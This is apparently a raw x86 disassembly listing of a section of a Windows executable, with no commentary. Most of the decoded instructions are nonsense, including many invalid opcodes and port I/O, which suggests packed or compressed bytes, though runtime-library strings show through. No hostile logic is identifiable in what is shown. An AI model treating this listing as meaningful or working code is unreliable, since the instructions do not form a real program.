  414e0a:	34 94                	xor    $0x94,%al
  414e0c:	75 1f                	jne    0x414e2d
  414e0e:	10 a2 42 4c f6 39    	adc    %ah,0x39f64c42(%edx)
  414e14:	c3                   	ret
  414e15:	11 d9                	adc    %ebx,%ecx
  414e17:	67 ec                	addr16 in (%dx),%al
  414e19:	24 45                	and    $0x45,%al
  414e1b:	91                   	xchg   %eax,%ecx
  414e1c:	d1 c9                	ror    $1,%ecx
  414e1e:	a1 d4 33 b6 ed       	mov    0xedb633d4,%eax
  414e23:	ab                   	stos   %eax,%es:(%edi)
  414e24:	3a 7c b8 37          	cmp    0x37(%eax,%edi,4),%bh
  414e28:	46                   	inc    %esi
  414e29:	d8 71 b0             	fdivs  -0x50(%ecx)
  414e2c:	fb                   	sti
  414e2d:	75 77                	jne    0x414ea6
  414e2f:	2e 4a                	cs dec %edx
  414e31:	93                   	xchg   %eax,%ebx
  414e32:	0a a1 a4 08 a3 0d    	or     0xda308a4(%ecx),%ah
  414e38:	b8 a0 04 ef 14       	mov    $0x14ef04a0,%eax
  414e3d:	75 81                	jne    0x414dc0
  414e3f:	be 8c c9 8f 7e       	mov    $0x7e8fc98c,%esi
  414e44:	7f 8f                	jg     0x414dd5
  414e46:	14 c6                	adc    $0xc6,%al
  414e48:	4a                   	dec    %edx
  414e49:	84 ba 1a 52 89 05    	test   %bh,0x589521a(%edx)
  414e4f:	49                   	dec    %ecx
  414e50:	89 42 ce             	mov    %eax,-0x32(%edx)
  414e53:	76 d8                	jbe    0x414e2d
  414e55:	2a f6                	sub    %dh,%dh
  414e57:	08 25 06 0c b3 11    	or     %ah,0x11b30c06
  414e5d:	65 83 18 4b          	sbbl   $0x4b,%gs:(%eax)
  414e61:	07                   	pop    %es
  414e62:	21 84 97 1c 0c 9b e1 	and    %eax,-0x1e64f3e4(%edi,%edx,4)
  414e69:	5b                   	pop    %ebx
  414e6a:	d8 04 70             	fadds  (%eax,%esi,2)
  414e6d:	1b 6d 20             	sbb    0x20(%ebp),%ebp
  414e70:	07                   	pop    %es
  414e71:	e8 5b 2f 52 d8       	call   0xd8937dd1
  414e76:	9b                   	fwait
  414e77:	2c 14                	sub    $0x14,%al
  414e79:	3c c3                	cmp    $0xc3,%al
  414e7b:	ab                   	stos   %eax,%es:(%edi)
  414e7c:	11 07                	adc    %eax,(%edi)
  414e7e:	64 90                	fs nop
  414e80:	41                   	inc    %ecx
  414e81:	06                   	push   %es
  414e82:	c4                   	(bad)
  414e83:	c0 bc 20 27 07 19 b8 	sarb   $0x58,-0x47e6f8d9(%eax,%eiz,1)
  414e8a:	58 
  414e8b:	12 54 83 0c          	adc    0xc(%ebx,%eax,4),%dl
  414e8f:	32 c8                	xor    %al,%cl
  414e91:	50                   	push   %eax
  414e92:	4c                   	dec    %esp
  414e93:	48                   	dec    %eax
  414e94:	44                   	inc    %esp
  414e95:	0c 32                	or     $0x32,%al
  414e97:	c8 20 40 3c          	enter  $0x4020,$0x3c
  414e9b:	38 32                	cmp    %dh,(%edx)
  414e9d:	c8 20 83 34          	enter  $0x8320,$0x34
  414ea1:	30 2c c8             	xor    %ch,(%eax,%ecx,8)
  414ea4:	20 83 0c 28 24 20    	and    %al,0x2024280c(%ebx)
  414eaa:	20 83 0c 32 1c 18    	and    %al,0x181c320c(%ebx)
  414eb0:	14 83                	adc    $0x83,%al
  414eb2:	0c 32                	or     $0x32,%al
  414eb4:	c8 10 0c 08          	enter  $0xc10,$0x8
  414eb8:	04 39                	add    $0x39,%al
  414eba:	39 c8                	cmp    %ecx,%eax
  414ebc:	20 00                	and    %al,(%eax)
  414ebe:	fc                   	cld
  414ebf:	11 f8                	adc    %edi,%eax
  414ec1:	64 90                	fs nop
  414ec3:	41                   	inc    %ecx
  414ec4:	06                   	push   %es
  414ec5:	f4                   	hlt
  414ec6:	f0 ec                	lock in (%dx),%al
  414ec8:	90                   	nop
  414ec9:	41                   	inc    %ecx
  414eca:	06                   	push   %es
  414ecb:	19 e8                	sbb    %ebp,%eax
  414ecd:	e4 e0                	in     $0xe0,%al
  414ecf:	41                   	inc    %ecx
  414ed0:	06                   	push   %es
  414ed1:	19 64 dc d8          	sbb    %esp,-0x28(%esp,%ebx,8)
  414ed5:	d4 0c                	aam    $0xc
  414ed7:	32 c8                	xor    %al,%cl
  414ed9:	c9                   	leave
  414eda:	6c                   	insb   (%dx),%es:(%edi)
  414edb:	12 68 64             	adc    0x64(%eax),%ch
  414ede:	60                   	pusha
  414edf:	c8 25 0f e1          	enter  $0xf25,$0xe1
  414ee3:	97                   	xchg   %eax,%edi
  414ee4:	79 5d                	jns    0x414f43
  414ee6:	e0 43                	loopne 0x414f2b
  414ee8:	e4 48                	in     $0x48,%al
  414eea:	1e                   	push   %ds
  414eeb:	80 5d e0 f3          	sbbb   $0xf3,-0x20(%ebp)
  414eef:	06                   	push   %es
  414ef0:	f9                   	stc
  414ef1:	4a                   	dec    %edx
  414ef2:	c1 f0 af             	shl    $0xaf,%eax
  414ef5:	07                   	pop    %es
  414ef6:	f1                   	int1
  414ef7:	f2 19 64 90 41       	repnz sbb %esp,0x41(%eax,%edx,4)
  414efc:	f3 f4                	repz hlt
  414efe:	f5                   	cmc
  414eff:	64 90                	fs nop
  414f01:	41                   	inc    %ecx
  414f02:	06                   	push   %es
  414f03:	f6 f7                	div    %bh
  414f05:	f8                   	clc
  414f06:	90                   	nop
  414f07:	41                   	inc    %ecx
  414f08:	06                   	push   %es
  414f09:	19 f9                	sbb    %edi,%ecx
  414f0b:	fa                   	cli
  414f0c:	fb                   	sti
  414f0d:	41                   	inc    %ecx
  414f0e:	06                   	push   %es
  414f0f:	19 64 fc fd          	sbb    %esp,-0x3(%esp,%edi,8)
  414f13:	fe                   	(bad)
  414f14:	9c                   	pushf
  414f15:	1c 64                	sbb    $0x64,%al
  414f17:	90                   	nop
  414f18:	ff e0                	jmp    *%eax
  414f1a:	e1 ff                	loope  0x414f1b
  414f1c:	e2 32                	loop   0x414f50
  414f1e:	c8 20 83 e3          	enter  $0x8320,$0xe3
  414f22:	e4 e5                	in     $0xe5,%al
  414f24:	c8 20 83 0c          	enter  $0x8320,$0xc
  414f28:	e6 e7                	out    %al,$0xe7
  414f2a:	e8 20 83 0c 32       	call   0x324dd24f
  414f2f:	e9 ea eb 83 0c       	jmp    0xcc53b1e
  414f34:	32 c8                	xor    %al,%cl
  414f36:	ec                   	in     (%dx),%al
  414f37:	ed                   	in     (%dx),%eax
  414f38:	ee                   	out    %al,(%dx)
  414f39:	ef                   	out    %eax,(%dx)
  414f3a:	0c 32                	or     $0x32,%al
  414f3c:	c8 20 d0 d1          	enter  $0xd020,$0xd1
  414f40:	d2 32                	shlb   %cl,(%edx)
  414f42:	c8 20 83 d3          	enter  $0x8320,$0xd3
  414f46:	d4 d5                	aam    $0xd5
  414f48:	c8 20 83 0c          	enter  $0x8320,$0xc
  414f4c:	d6                   	salc
  414f4d:	d7                   	xlat   %ds:(%ebx)
  414f4e:	d8 20                	fsubs  (%eax)
  414f50:	83 0c 32 d9          	orl    $0xffffffd9,(%edx,%esi,1)
  414f54:	da db                	fcmovu %st(3),%st
  414f56:	83 0c 32 c8          	orl    $0xffffffc8,(%edx,%esi,1)
  414f5a:	dc dd                	(bad)
  414f5c:	de df                	(bad)
  414f5e:	0c 32                	or     $0x32,%al
  414f60:	c8 20 c0 c1          	enter  $0xc020,$0xc1
  414f64:	c2 32 c8             	ret    $0xc832
  414f67:	20 83 c3 c4 c5 c8    	and    %al,-0x373a3b3d(%ebx)
  414f6d:	20 83 0c c6 c7 c8    	and    %al,-0x373839f4(%ebx)
  414f73:	20 83 0c 32 c9 ca    	and    %al,-0x3536cdf4(%ebx)
  414f79:	cb                   	lret
  414f7a:	83 0c 32 c8          	orl    $0xffffffc8,(%edx,%esi,1)
  414f7e:	cc                   	int3
  414f7f:	cd ce                	int    $0xce
  414f81:	cf                   	iret
  414f82:	0c 32                	or     $0x32,%al
  414f84:	c8 20 b0 b1          	enter  $0xb020,$0xb1
  414f88:	b2 32                	mov    $0x32,%dl
  414f8a:	c8 20 83 b3          	enter  $0x8320,$0xb3
  414f8e:	b4 b5                	mov    $0xb5,%ah
  414f90:	c8 20 83 0c          	enter  $0x8320,$0xc
  414f94:	b6 b7                	mov    $0xb7,%dh
  414f96:	b8 20 83 0c 32       	mov    $0x320c8320,%eax
  414f9b:	b9 ba bb 83 0c       	mov    $0xc83bbba,%ecx
  414fa0:	32 c8                	xor    %al,%cl
  414fa2:	bc bd be bf 72       	mov    $0x72bfbebd,%esp
  414fa7:	30 cc                	xor    %cl,%ah
  414fa9:	20 a0 bf 39 60 8e    	and    %ah,-0x719fc641(%eax)
  414faf:	e4 81                	in     $0x81,%al
  414fb1:	5c                   	pop    %esp
  414fb2:	e4 40                	in     $0x40,%al
  414fb4:	60                   	pusha
  414fb5:	e4 03                	in     $0x3,%al
  414fb7:	1b e6                	sbb    %esi,%esp
  414fb9:	46                   	inc    %esi
  414fba:	98                   	cwtl
  414fbb:	17                   	pop    %ss
  414fbc:	00 0b                	add    %cl,(%ebx)
  414fbe:	5b                   	pop    %ebx
  414fbf:	10 cd                	adc    %cl,%ch
  414fc1:	61                   	popa
  414fc2:	13 aa 0c 3f 0c 87    	adc    -0x78f3c0f4(%edx),%ebp
  414fc8:	01 47 c9             	add    %eax,-0x37(%edi)
  414fcb:	10 40 0e             	adc    %al,0xe(%eax)
  414fce:	d4 00                	aam    $0x0
  414fd0:	2a fe                	sub    %dh,%bh
  414fd2:	59                   	pop    %ecx
  414fd3:	10 75 09             	adc    %dh,0x9(%ebp)
  414fd6:	45                   	inc    %ebp
  414fd7:	78 63                	js     0x41503c
  414fd9:	65 70 4b             	gs jo  0x415027
  414fdc:	64 41                	fs inc %ecx
  414fde:	ec                   	in     (%dx),%al
  414fdf:	f5                   	cmc
  414fe0:	00 61 a7             	add    %ah,-0x59(%ecx)
  414fe3:	1f                   	pop    %ds
  414fe4:	90                   	nop
  414fe5:	57                   	push   %edi
  414fe6:	c8 ee 10 67          	enter  $0x10ee,$0x67
  414fea:	4c                   	dec    %esp
  414feb:	60                   	pusha
  414fec:	80 7e 43 d9          	cmpb   $0xd9,0x43(%esi)
  414ff0:	c9                   	leave
  414ff1:	7e 45                	jle    0x415038
  414ff3:	48                   	dec    %eax
  414ff4:	65 61                	gs popa
  414ff6:	70 5a                	jo     0x415052
  414ff8:	90                   	nop
  414ff9:	5c                   	pop    %esp
  414ffa:	5b                   	pop    %ebx
  414ffb:	5c                   	pop    %esp
  414ffc:	ff 00                	incl   (%eax)
  414ffe:	c8 20 b4 0c          	enter  $0xb420,$0xc
  415002:	45                   	inc    %ebp
  415003:	4f                   	dec    %edi
  415004:	75 74                	jne    0x41507a
  415006:	4f                   	dec    %edi
  415007:	66 c9                	leavew
  415009:	50                   	push   %eax
  41500a:	e6 fe                	out    %al,$0xfe
  41500c:	4d                   	dec    %ebp
  41500d:	65 6d                	gs insl (%dx),%es:(%edi)
  41500f:	6f                   	outsl  %ds:(%esi),(%dx)
  415010:	72 79                	jb     0x41508b
  415012:	8d                   	lea    (bad),%ebx
  415013:	db b7 b8 dd 7d 12    	(bad) 0x127dddb8(%edi)
  415019:	56                   	push   %esi
  41501a:	1f                   	pop    %ds
  41501b:	0b 45 49             	or     0x49(%ebp),%eax
  41501e:	6e                   	outsb  %ds:(%esi),(%dx)
  41501f:	5d                   	pop    %ebp
  415020:	45                   	inc    %ebp
  415021:	72 72                	jb     0x415095
  415023:	05 f2 22 bb 5b       	add    $0x5bbb22f2,%eax
  415028:	10 62 57             	adc    %ah,0x57(%edx)
  41502b:	10 62 6e             	adc    %ah,0x6e(%edx)
  41502e:	d4 42                	aam    $0x42
  415030:	61                   	popa
  415031:	65 0b 74 8f 61       	or     %gs:0x61(%edi,%ecx,4),%esi
  415036:	6c                   	insb   (%dx),%es:(%edi)
  415037:	07                   	pop    %es
  415038:	19 ca                	sbb    %ecx,%edx
  41503a:	16                   	push   %ss
  41503b:	d7                   	xlat   %ds:(%ebx)
  41503c:	68 57 68 c4 61       	push   $0x61c46857
  415041:	12 92 5c 25 12 6b    	adc    0x6b12255c(%edx),%dl
  415047:	81 90 a1 ec c8 5f c8 	adcl   $0x9b764c8,0x5fc8eca1(%eax)
  41504e:	64 b7 09 
  415051:	86 09                	xchg   %cl,(%ecx)
  415053:	0f 0d b7 20 63 57 5f 	prefetch 0x5f576320(%edi)
  41505a:	25 4f 5e 20 63       	and    $0x63205e4f,%eax
  41505f:	7c 62                	jl     0x4150c3
  415061:	0a 45 44             	or     0x44(%ebp),%al
  415064:	21 43 c9             	and    %eax,-0x37(%ebx)
  415067:	ff 69 76             	ljmp   *0x76(%ecx)
  41506a:	42                   	inc    %edx
  41506b:	79 5a                	jns    0x4150c7
  41506d:	65 72 6f             	gs jb  0x4150df
  415070:	90                   	nop
  415071:	78 78                	js     0x4150eb
  415073:	6c                   	insb   (%dx),%es:(%edi)
  415074:	e4 17                	in     $0x17,%al
  415076:	02 bf 52 61 6e 67    	add    0x676e6152(%edi),%bh
  41507c:	65 d0 57 1b          	rclb   $1,%gs:0x1b(%edi)
  415080:	81 90 a1 d0 73 49 91 	adcl   $0x97f9b091,0x4973d0a1(%eax)
  415087:	b0 f9 97 
  41508a:	6e                   	outsb  %ds:(%esi),(%dx)
  41508b:	76 65                	jbe    0x4150f2
  41508d:	72 66                	jb     0x4150f5
  41508f:	6c                   	insb   (%dx),%es:(%edi)
  415090:	6f                   	outsl  %ds:(%esi),(%dx)
  415091:	77 2c                	ja     0x4150bf
  415093:	64 63 b5 b0 02 79 2c 	arpl   %esi,%fs:0x2c7902b0(%ebp)
  41509a:	64 0b 4d 0b          	or     %fs:0xb(%ebp),%ecx
  41509e:	65 c7                	gs (bad)
  4150a0:	5a                   	pop    %edx
  4150a1:	92                   	xchg   %eax,%edx
  4150a2:	b2 90                	mov    $0x90,%dl
  4150a4:	84 57 1f             	test   %dl,0x1f(%edi)
  4150a7:	68 ae 92 df b3       	push   $0xb3df92ae
  4150ac:	e0 63                	loopne 0x415111
  4150ae:	0a 76 21             	or     0x21(%esi),%dh
  4150b1:	43                   	inc    %ebx
  4150b2:	d9 df                	(bad)
  4150b4:	18 69 64             	sbb    %ch,0x64(%ecx)
  4150b7:	4f                   	dec    %edi
  4150b8:	70 90                	jo     0x41504a
  4150ba:	dc 57 dc             	fcoml  -0x24(%edi)
  4150bd:	66 38 14 02          	data16 cmp %dl,(%edx,%eax,1)
  4150c1:	63 b6 bf 59 0a e4    	arpl   %esi,-0x1bf5a641(%esi)
  4150c7:	45                   	inc    %ebp
  4150c8:	f6 65 34             	mulb   0x34(%ebp)
  4150cb:	65 57                	gs push %edi
  4150cd:	34 65                	xor    $0x65,%al
  4150cf:	b6 31                	mov    $0x31,%dh
  4150d1:	84 c6                	test   %al,%dh
  4150d3:	6b 60 6b 8c          	imul   $0xffffff8c,0x6b(%eax),%esp
  4150d7:	57                   	push   %edi
  4150d8:	57                   	push   %edi
  4150d9:	20 bc 50 1f 07 55 7a 	and    %bh,0x7a55071f(%eax,%edx,2)
  4150e0:	a1 ec d9 6e 64       	mov    0x646ed9ec,%eax
  4150e5:	58                   	pop    %eax
  4150e6:	90                   	nop
  4150e7:	e4 57                	in     $0x57,%al
  4150e9:	1f                   	pop    %ds
  4150ea:	fd                   	std
  4150eb:	10 8e c0 87 0f 5f    	adc    %cl,0x5f0f87c0(%esi)
  4150f1:	50                   	push   %eax
  4150f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4150f3:	69 6e d6 b7 c8 36 84 	imul   $0x8436c8b7,-0x2a(%esi),%ebp
  4150fa:	40                   	inc    %eax
  4150fb:	66 5b                	pop    %bx
  4150fd:	1f                   	pop    %ds
  4150fe:	0c 2f                	or     $0x2f,%al
  415100:	8e 1f                	mov    (%edi),%ds
  415102:	36 04 0c             	ss add $0xc,%al
  415105:	5b                   	pop    %ebx
  415106:	43                   	inc    %ebx
  415107:	61                   	popa
  415108:	73 74                	jae    0x41517e
  41510a:	6f                   	outsl  %ds:(%esi),(%dx)
  41510b:	07                   	pop    %es
  41510c:	42                   	inc    %edx
  41510d:	86 b2 9c 5b 9c 0d    	xchg   %dh,0xd9c5b9c(%edx)
  415113:	45                   	inc    %ebp
  415114:	ec                   	in     (%dx),%al
  415115:	90                   	nop
  415116:	0c ad                	or     $0xad,%al
  415118:	43                   	inc    %ebx
  415119:	25 69 d7 f8 5b       	and    $0x5bf8d769,%eax
  41511e:	8f c0                	pop    %eax
  415120:	78 a1                	js     0x4150c3
  415122:	1f                   	pop    %ds
  415123:	cb                   	lret
  415124:	10 45 f4             	adc    %al,-0xc(%ebp)
  415127:	ba f5 d6 41 63       	mov    $0x6341d6f5,%edx
  41512c:	87 73 73             	xchg   %esi,0x73(%ebx)
  41512f:	56                   	push   %esi
  415130:	88 6c 61 8d          	mov    %ch,-0x73(%ecx,%eiz,2)
  415134:	10 f2                	adc    %dh,%dl
  415136:	22 d9                	and    %cl,%bl
  415138:	2b 58 67             	sub    0x67(%eax),%ebx
  41513b:	58                   	pop    %eax
  41513c:	67 ca 2e ed          	addr16 lret $0xed2e
  415140:	78 50                	js     0x415192
  415142:	72 78                	jb     0x4151bc
  415144:	6c                   	insb   (%dx),%es:(%edi)
  415145:	65 e3 90             	gs jecxz 0x4150d8
  415148:	b0 57                	mov    $0x57,%al
  41514a:	6f                   	outsl  %ds:(%esi),(%dx)
  41514b:	10 08                	adc    %cl,(%eax)
  41514d:	19 b0 af 53 74 61    	sbb    %esi,0x617453af(%eax)
  415153:	45                   	inc    %ebp
  415154:	02 1f                	add    (%edi),%bl
  415156:	c6                   	(bad)
  415157:	63 6b 80             	arpl   %ebp,-0x80(%ebx)
  41515a:	90                   	nop
  41515b:	0c 68                	or     $0x68,%al
  41515d:	43                   	inc    %ebx
  41515e:	42                   	inc    %edx
  41515f:	c3                   	ret
  415160:	20 e4                	and    %ah,%ah
  415162:	0c 68                	or     $0x68,%al
  415164:	6f                   	outsl  %ds:(%esi),(%dx)
  415165:	74 6a                	je     0x4151d1
  415167:	78 a1                	js     0x41510a
  415169:	6c                   	insb   (%dx),%es:(%edi)
  41516a:	e1 6c                	loope  0x4151d8
  41516c:	43                   	inc    %ebx
  41516d:	6b 64 57 1f 02       	imul   $0x2,0x1f(%edi,%edx,2),%esp
  415172:	0b af 40 c7 56 61    	or     0x6156c740(%edi),%ebp
  415178:	0c 61                	or     $0x61,%al
  41517a:	9f                   	lahf
  41517b:	10 32                	adc    %dh,(%edx)
  41517d:	94                   	xchg   %eax,%esp
  41517e:	4d                   	dec    %ebp
  41517f:	c0 5b c0 0d          	rcrb   $0xd,-0x40(%ebx)
  415183:	8e 82 21 c7 c4 22    	mov    0x22c4c721(%edx),%es
  415189:	c1 46 17 d9          	roll   $0xd9,0x17(%esi)
  41518d:	86 86 61 6e 64 c7    	xchg   %al,-0x389b919f(%esi)
  415193:	20 69 5f             	and    %ch,0x5f(%ecx)
  415196:	20 36                	and    %dh,(%esi)
  415198:	96                   	xchg   %eax,%esi
  415199:	2b 90 69 0e 62 d8    	sub    -0x279df197(%eax),%edx
  41519f:	72 19                	jb     0x4151ba
  4151a1:	ca 9e 15             	lret   $0x159e
  4151a4:	72 bc                	jb     0x415162
  4151a6:	90                   	nop
  4151a7:	7c 5b                	jl     0x415204
  4151a9:	7c 3b                	jl     0x4151e6
  4151ab:	35 90 08 ab 66       	xor    $0x66ab0890,%eax
  4151b0:	38 5b 2c             	cmp    %bl,0x2c(%ebx)
  4151b3:	5e                   	pop    %esi
  4151b4:	28 39                	sub    %bh,(%ecx)
  4151b6:	d8 1f                	fcomps (%edi)
  4151b8:	1f                   	pop    %ds
  4151b9:	64 47                	fs inc %edi
  4151bb:	fe 0a                	decb   (%edx)
  4151bd:	57                   	push   %edi
  4151be:	69 6e 33 32 30 6a b3 	imul   $0xb36a3032,0x33(%esi),%ebp
  4151c5:	4b                   	dec    %ebx
  4151c6:	ac                   	lods   %ds:(%esi),%al
  4151c7:	40                   	inc    %eax
  4151c8:	5e                   	pop    %esi
  4151c9:	30 6a c7             	xor    %ch,-0x39(%edx)
  4151cc:	53                   	push   %ebx
  4151cd:	74 dd                	je     0x4151ac
  4151cf:	80 fc 61             	cmp    $0x61,%ah
  4151d2:	66 65 63 61 6c       	arpl   %sp,%gs:0x6c(%ecx)
  4151d7:	ff 00                	incl   (%eax)
  4151d9:	01 4b 24             	add    %ecx,0x24(%ebx)
  4151dc:	1b ad 74 d3 54 11    	sbb    0x1154d374(%ebp),%ebp
  4151e2:	12 54 5c 19          	adc    0x19(%esp,%ebx,2),%dl
  4151e6:	a2 54 d8 17 e4       	mov    %al,0xe417d854
  4151eb:	ff 68 72             	ljmp   *0x72(%eax)
  4151ee:	65 61                	gs popa
  4151f0:	64 41                	fs inc %ecx
  4151f2:	72 72                	jb     0x415266
  4151f4:	61                   	popa
  4151f5:	79 08                	jns    0x4151ff
  4151f7:	2b c0                	sub    %eax,%eax
  4151f9:	8f                   	(bad)
  4151fa:	d4 4c                	aam    $0x4c
  4151fc:	99                   	cltd
  4151fd:	0b 0b                	or     (%ebx),%ecx
  4151ff:	8f                   	(bad)
  415200:	d2 38                	sarb   %cl,(%eax)
  415202:	3b 90 03 60 27 18    	cmp    0x18276003(%eax),%edx
  415208:	8c 50 35             	mov    %ss,0x35(%eax)
  41520b:	ee                   	out    %al,(%dx)
  41520c:	dc f6                	fdiv   %st,%st(6)
  41520e:	af                   	scas   %es:(%edi),%eax
  41520f:	28 85 54 4d 75 6c    	sub    %al,0x6c754d54(%ebp)
  415215:	7d 52                	jge    0x415269
  415217:	79 a2                	jns    0x4151bb
  415219:	6c                   	insb   (%dx),%es:(%edi)
  41521a:	75 73                	jne    0x41528f
  41521c:	d6                   	salc
  41521d:	be d5 e8 88 57       	mov    $0x5788e8d5,%esi
  415222:	7e f7                	jle    0x41521b
  415224:	53                   	push   %ebx
  415225:	79 6e                	jns    0x415295
  415227:	63 90 af 28 36 44    	arpl   %edx,0x443628af(%eax)
  41522d:	e3 69                	jecxz  0x415298
  41522f:	7a 2f                	jp     0x415260
  415231:	6f                   	outsl  %ds:(%esi),(%dx)
  415232:	6a 00                	push   $0x0
  415234:	36 e4 47             	ss in  $0x47,%al
  415237:	43                   	inc    %ebx
  415238:	d2 ee                	shr    %cl,%dh
  41523a:	4a                   	dec    %edx
  41523b:	6b 15 ff 47 15 8a 3e 	imul   $0x3e,0x8a1547ff,%edx
  415242:	9e                   	sahf
  415243:	3b 0c 8b             	cmp    (%ebx,%ecx,4),%ecx
  415246:	4d                   	dec    %ebp
  415247:	fc                   	cld
  415248:	b2 01                	mov    $0x1,%dl
  41524a:	6e                   	outsb  %ds:(%esi),(%dx)
  41524b:	11 3b                	adc    %edi,(%ebx)
  41524d:	d7                   	xlat   %ds:(%ebx)
  41524e:	a1 50 59 0e 6d       	mov    0x6d0e5950,%eax
  415253:	2c 53                	sub    $0x53,%al
  415255:	1e                   	push   %ds
  415256:	c8 78 11 cd          	enter  $0x1178,$0xcd
  41525a:	43                   	inc    %ebx
  41525b:	51                   	push   %ecx
  41525c:	6b fc 0e             	imul   $0xe,%esp,%edi
  41525f:	5b                   	pop    %ebx
  415260:	21 2e                	and    %ebp,(%esi)
  415262:	a3 4d 59 cf 43       	mov    %eax,0x43cf594d
  415267:	53                   	push   %ebx
  415268:	8e 44 74 44          	mov    0x44(%esp,%esi,2),%es
  41526c:	77 09                	ja     0x415277
  41526e:	ea 09 d2 ff 05 ea ef 	ljmp   $0xefea,$0x5ffd209
  415275:	06                   	push   %es
  415276:	52                   	push   %edx
  415277:	fc                   	cld
  415278:	89 c1                	mov    %eax,%ecx
  41527a:	39 d1                	cmp    %edx,%ecx
  41527c:	76 62                	jbe    0x4152e0
  41527e:	39 c9                	cmp    %ecx,%ecx
  415280:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  415282:	74 2a                	je     0x4152ae
  415284:	8a 5e 01             	mov    0x1(%esi),%bl
  415287:	b7 8e                	mov    $0x8e,%bh
  415289:	80 ff 23             	cmp    $0x23,%bh
  41528c:	08 04 7a             	or     %al,(%edx,%edi,2)
  41528f:	77 ff                	ja     0x415290
  415291:	79 b6                	jns    0x415249
  415293:	1d 28 8a 7f 0f       	sbb    $0xf7f8a28,%eax
  415298:	ff                   	(bad)
  415299:	ff                   	ljmp   (bad)
  41529a:	ef                   	out    %eax,(%dx)
  41529b:	20 38                	and    %bh,(%eax)
  41529d:	fb                   	sti
  41529e:	74 d8                	je     0x415278
  4152a0:	01 b4 f6 ed 0f b6 c3 	add    %esi,-0x3c49f013(%esi,%esi,8)
  4152a7:	02 d7                	add    %bh,%dl
  4152a9:	29 d0                	sub    %edx,%eax
  4152ab:	5b                   	pop    %ebx
  4152ac:	56                   	push   %esi
  4152ad:	53                   	push   %ebx
  4152ae:	1b 44 d7 6d          	sbb    0x6d(%edi,%edx,8),%eax
  4152b2:	31 19                	xor    %ebx,(%ecx)
  4152b4:	50                   	push   %eax
  4152b5:	17                   	pop    %ss
  4152b6:	4d                   	dec    %ebp
  4152b7:	14 59                	adc    $0x59,%al
  4152b9:	3b 68 d1             	cmp    -0x2f(%eax),%ebp
  4152bc:	2e ea 4a fc 75 6c 5b 	cs ljmp $0x545b,$0x6c75fc4a
  4152c3:	54 
  4152c4:	7a 6f                	jp     0x415335
  4152c6:	06                   	push   %es
  4152c7:	d5 a2                	aad    $0xa2
  4152c9:	cd eb                	int    $0xeb
  4152cb:	cf                   	iret
  4152cc:	ab                   	stos   %eax,%es:(%edi)
  4152cd:	78 7f                	js     0x41534e
  4152cf:	01 8b 26 54 50 07    	add    %ecx,0x7505426(%ebx)
  4152d5:	83 1c 56 f1          	sbbl   $0xfffffff1,(%esi,%edx,2)
  4152d9:	9e                   	sahf
  4152da:	cc                   	int3
  4152db:	0f 93 01             	setae  (%ecx)
  4152de:	5a                   	pop    %edx
  4152df:	d5 ee                	aad    $0xee
  4152e1:	05 ce 0c 4c 28       	add    $0x284c0cce,%eax
  4152e6:	3f                   	aas
  4152e7:	88 a5 6a a8 e7 51    	mov    %ah,0x51e7a86a(%ebp)
  4152ed:	75 d4                	jne    0x4152c3
  4152ef:	01 6d cf             	add    %ebp,-0x31(%ebp)
  4152f2:	05 79 18 b8 02       	add    $0x2b81879,%eax
  4152f7:	2a 5a e0             	sub    -0x20(%edx),%bl
  4152fa:	33 aa 8b 97 17 f0    	xor    -0xfe86875(%edx),%ebp
  415300:	ba 6a 03 6a bf       	mov    $0xbf6a036a,%edx
  415305:	44                   	inc    %esp
  415306:	ae                   	scas   %es:(%edi),%al
  415307:	a3 56 f0 0a f5       	mov    %eax,0xf50af056
  41530c:	8b 04 85 04 f1 33 6f 	mov    0x6f33f104(,%eax,4),%eax
  415313:	6f                   	outsl  %ds:(%esi),(%dx)
  415314:	11 f9                	adc    %edi,%ecx
  415316:	83 e3 03             	and    $0x3,%ebx
  415319:	0a 9d f8 f0 6f 76    	or     0x766ff0f8(%ebp),%bl
  41531f:	46                   	inc    %esi
  415320:	f5                   	cmc
  415321:	0d 58 48 1f d8       	or     $0xd81f4858,%eax
  415326:	3c de                	cmp    $0xde,%al
  415328:	e1 15                	loope  0x41533f
  41532a:	1c 02                	sbb    $0x2,%al
  41532c:	20 f3                	and    %dh,%bl
  41532e:	86 9c f0 aa c9 26 5b 	xchg   %bl,0x5b26c9aa(%eax,%esi,8)
  415335:	9c                   	pushf
  415336:	87 6a 76             	xchg   %ebp,0x76(%edx)
  415339:	ad                   	lods   %ds:(%esi),%eax
  41533a:	22 42 47             	and    0x47(%edx),%al
  41533d:	fe                   	(bad)
  41533e:	d7                   	xlat   %ds:(%ebx)
  41533f:	4d                   	dec    %ebp
  415340:	00 a0 47 a1 68 07    	add    %ah,0x768a147(%eax)
  415346:	7e 33                	jle    0x41537b
  415348:	c8 14 66 58          	enter  $0x6614,$0x58
  41534c:	d7                   	xlat   %ds:(%ebx)
  41534d:	5a                   	pop    %edx
  41534e:	5a                   	pop    %edx
  41534f:	2b 28                	sub    (%eax),%ebp
  415351:	0a df                	or     %bh,%bl
  415353:	a9 02 69 1c 10       	test   $0x101c6902,%eax
  415358:	17                   	pop    %ss
  415359:	98                   	cwtl
  41535a:	07                   	pop    %es
  41535b:	a2 fc 07 4c 20       	mov    %al,0x204c07fc
  415360:	47                   	inc    %edi
  415361:	b4 3a                	mov    $0x3a,%ah
  415363:	b0 cf                	mov    $0xcf,%al
  415365:	15 30 08 50 8d       	adc    $0x8d500830,%eax
  41536a:	88 f0                	mov    %dh,%al
  41536c:	d8 b1 a6 8f 34 0a    	fdivs  0xa348fa6(%ecx)
  415372:	80 f6 1e             	xor    $0x1e,%dh
  415375:	10 75 25             	adc    %dh,0x25(%ebp)
  415378:	f0 9d                	lock popf
  41537a:	cd 14                	int    $0x14
  41537c:	23 2b                	and    (%ebx),%ebp
  41537e:	c8 18 78 fb          	enter  $0x7818,$0xfb
  415382:	de cd                	fmulp  %st,%st(5)
  415384:	14 63                	adc    $0x63,%al
  415386:	03 fe                	add    %esi,%edi
  415388:	50                   	push   %eax
  415389:	17                   	pop    %ss
  41538a:	10 70 7b             	adc    %dh,0x7b(%eax)
  41538d:	48                   	dec    %eax
  41538e:	41                   	inc    %ecx
  41538f:	8b 1c 45 fc 06 f3 30 	mov    0x30f306fc(,%eax,2),%ebx
  415396:	f6 cf aa             	test   $0xaa,%bh
  415399:	ef                   	out    %eax,(%dx)
  41539a:	5c                   	pop    %esp
  41539b:	ec                   	in     (%dx),%al
  41539c:	40                   	inc    %eax
  41539d:	0f 95 c0             	setne  %al
  4153a0:	b7 55                	mov    $0x55,%bh
